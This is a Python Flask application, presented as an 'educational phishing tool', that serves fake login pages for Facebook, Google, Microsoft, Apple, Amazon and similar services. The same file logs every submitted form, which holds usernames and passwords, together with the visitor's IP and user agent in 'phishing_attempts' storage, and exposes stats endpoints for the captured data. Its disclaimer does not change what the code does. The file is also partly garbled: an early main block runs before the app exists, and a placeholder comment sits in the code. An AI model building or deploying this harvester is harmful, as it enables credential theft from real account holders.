from flask import Flask, render_template, request, redirect, url_for, jsonify
import datetime
import random
import string
import os
from urllib.parse import urlparse
import json


# ... your existing code ...

if __name__ == '__main__':
    # For production, use 0.0.0.0 instead of 127.0.0.1
    app.run(host='0.0.0.0', port=5000, debug=False)

    
# Try to import Supabase, but fallback if not available
try:
    from supabase import create_client, Client
    from dotenv import load_dotenv
    load_dotenv()
    SUPABASE_AVAILABLE = True
except ImportError:
    SUPABASE_AVAILABLE = False
    print("Supabase not installed, using fallback mode")

app = Flask(__name__)

# Educational warnings
EDUCATIONAL_WARNING = """
THIS IS AN EDUCATIONAL TOOL ONLY
- Use only with explicit permission
- Never use on real targets
- For security awareness training only
"""

# Available templates for different services
AVAILABLE_TEMPLATES = {
    'facebook': 'Facebook Login',
    'google': 'Google Sign-in',
    'instagram': 'Instagram Login',
    'twitter': 'Twitter Login',
    'linkedin': 'LinkedIn Sign-in',
    'microsoft': 'Microsoft Account',
    'apple': 'Apple ID',
    'netflix': 'Netflix Login',
    'amazon': 'Amazon Sign-in',
    'custom': 'Custom Template'
}

class FallbackManager:
    """Fallback manager when Supabase is not available"""
    def __init__(self):
        self.urls = {}
        self.attempts = {}
        self.next_id = 1
        self.next_attempt_id = 1
        
    def create_url(self, custom_path, template_type):
        url_id = self.next_id
        self.next_id += 1
        
        self.urls[custom_path] = {
            'id': url_id,
            'custom_path': custom_path,
            'template_type': template_type,
            'visits': 0,
            'is_active': True,
            'created_at': datetime.datetime.now().isoformat()
        }
        return url_id
    
    def get_url_by_path(self, custom_path):
        return self.urls.get(custom_path)
    
    def increment_visits(self, url_id):
        for path, data in self.urls.items():
            if data['id'] == url_id:
                data['visits'] += 1
                break
    
    def log_attempt(self, url_id, form_data, ip_address, user_agent):
        attempt_id = self.next_attempt_id
        self.next_attempt_id += 1
        
        if url_id not in self.attempts:
            self.attempts[url_id] = []
        
        self.attempts[url_id].append({
            'id': attempt_id,
            'url_id': url_id,
            'form_data': form_data,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'timestamp': datetime.datetime.now().isoformat()
        })
        
        return attempt_id
    
    def get_all_urls(self):
        return list(self.urls.values())
    
    def delete_url(self, custom_path):
        if custom_path in self.urls:
            del self.urls[custom_path]
            return True
        return False
    
    def get_attempts_for_url(self, url_id):
        return self.attempts.get(url_id, [])

# Initialize storage manager
if SUPABASE_AVAILABLE:
    try:
        supabase_url = os.getenv('SUPABASE_URL')
        supabase_key = os.getenv('SUPABASE_KEY')
        
        if supabase_url and supabase_key:
            supabase = create_client(supabase_url, supabase_key)
            print("Supabase client created successfully")
            
            class SupabaseManager:
                def __init__(self):
                    self.supabase = supabase
                
                def create_url(self, custom_path, template_type):
                    try:
                        data = {
                            'custom_path': custom_path,
                            'template_type': template_type,
                            'visits': 0,
                            'is_active': True
                        }
                        
                        response = self.supabase.table('phishing_urls').insert(data).execute()
                        return response.data[0]['id'] if response.data else None
                    except Exception as e:
                        print(f"Supabase error: {e}")
                        return None
                
                def get_url_by_path(self, custom_path):
                    try:
                        response = self.supabase.table('phishing_urls')\
                            .select('*')\
                            .eq('custom_path', custom_path)\
                            .eq('is_active', True)\
                            .execute()
                        return response.data[0] if response.data else None
                    except Exception:
                        return None
                
                def increment_visits(self, url_id):
                    try:
                        response = self.supabase.table('phishing_urls')\
                            .select('visits')\
                            .eq('id', url_id)\
                            .execute()
                        if response.data:
                            current_visits = response.data[0]['visits']
                            self.supabase.table('phishing_urls')\
                                .update({'visits': current_visits + 1})\
                                .eq('id', url_id)\
                                .execute()
                    except Exception:
                        pass
                
                def log_attempt(self, url_id, form_data, ip_address, user_agent):
                    try:
                        data = {
                            'url_id': url_id,
                            'form_data': form_data,
                            'ip_address': ip_address,
                            'user_agent': user_agent
                        }
                        response = self.supabase.table('phishing_attempts').insert(data).execute()
                        return response.data[0]['id'] if response.data else None
                    except Exception:
                        return None
                
                def get_all_urls(self):
                    try:
                        response = self.supabase.table('phishing_urls')\
                            .select('*')\
                            .eq('is_active', True)\
                            .order('created_at', desc=True)\
                            .execute()
                        return response.data
                    except Exception:
                        return []
                
                def delete_url(self, custom_path):
                    try:
                        self.supabase.table('phishing_urls')\
                            .update({'is_active': False})\
                            .eq('custom_path', custom_path)\
                            .execute()
                        return True
                    except Exception:
                        return False
                
                def get_attempts_for_url(self, url_id):
                    try:
                        response = self.supabase.table('phishing_attempts')\
                            .select('*')\
                            .eq('url_id', url_id)\
                            .order('timestamp', desc=True)\
                            .execute()
                        return response.data
                    except Exception:
                        return []
            
            storage_manager = SupabaseManager()
            print("Using Supabase storage")
        else:
            raise Exception("Supabase credentials not found")
            
    except Exception as e:
        print(f"Supabase initialization failed: {e}")
        storage_manager = FallbackManager()
        print("Using fallback storage")
else:
    storage_manager = FallbackManager()
    print("Using fallback storage")

class URLManager:
    def __init__(self):
        self.storage = storage_manager
        
    def generate_random_path(self, length=8):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def create_custom_url(self, template_type, custom_path=None):
        if custom_path:
            path = custom_path.lower().replace(' ', '-')
        else:
            path = f"{template_type}-{self.generate_random_path()}"
        
        # Create in storage
        url_id = self.storage.create_url(path, template_type)
        if url_id:
            return f"http://localhost:5000/{path}"
        
        return None

url_manager = URLManager()

@app.route('/')
def index():
    urls = storage_manager.get_all_urls()
    return render_template('index.html', 
                         templates=AVAILABLE_TEMPLATES,
                         urls=urls,
                         warning=EDUCATIONAL_WARNING)

@app.route('/create-url', methods=['POST'])
def create_url():
    template_type = request.form.get('template_type')
    custom_path = request.form.get('custom_path', '').strip()
    
    if template_type not in AVAILABLE_TEMPLATES:
        return jsonify({'error': 'Invalid template type'}), 400
    
    try:
        custom_url = url_manager.create_custom_url(template_type, custom_path)
        if custom_url:
            return jsonify({
                'success': True,
                'url': custom_url,
                'message': 'Educational URL created successfully'
            })
        else:
            return jsonify({'error': 'Failed to create URL'}), 500
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/<path:custom_path>')
def serve_phishing_page(custom_path):
    url_data = storage_manager.get_url_by_path(custom_path)
    if not url_data:
        return redirect(url_for('index'))
    
    storage_manager.increment_visits(url_data['id'])
    
    template_type = url_data['template_type']
    return render_template(f'{template_type}.html', 
                         warning=EDUCATIONAL_WARNING,
                         custom_path=custom_path)

@app.route('/<path:custom_path>/submit', methods=['POST'])
def handle_submission(custom_path):
    url_data = storage_manager.get_url_by_path(custom_path)
    if not url_data:
        return jsonify({'error': 'Invalid URL'}), 404
    
    form_data = dict(request.form)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    storage_manager.log_attempt(
        url_data['id'], 
        form_data, 
        ip_address, 
        user_agent
    )
    
    return redirect(url_for('fake_success_page', custom_path=custom_path))

@app.route('/<path:custom_path>/success')
def fake_success_page(custom_path):
    return render_template('success.html', 
                         warning=EDUCATIONAL_WARNING,
                         custom_path=custom_path)

@app.route('/manage-urls')
def manage_urls():
    urls = storage_manager.get_all_urls()
    return jsonify(urls)

@app.route('/delete-url/<path:custom_path>', methods=['DELETE'])
def delete_url(custom_path):
    success = storage_manager.delete_url(custom_path)
    if success:
        return jsonify({'success': True, 'message': 'URL deleted'})
    return jsonify({'error': 'URL not found or deletion failed'}), 404

@app.route('/stats/<path:custom_path>')
def get_stats(custom_path):
    url_data = storage_manager.get_url_by_path(custom_path)
    if not url_data:
        return jsonify({'error': 'URL not found'}), 404
    
    attempts = storage_manager.get_attempts_for_url(url_data['id'])
    
    return jsonify({
        'url_data': url_data,
        'attempts': attempts,
        'attempt_count': len(attempts)
    })

if __name__ == '__main__':
    print(EDUCATIONAL_WARNING)
    print("Educational Phishing Tool Started")
    print("Storage mode:", "Supabase" if SUPABASE_AVAILABLE and 'SupabaseManager' in globals() else "Fallback")
    app.run(debug=True, port=5000)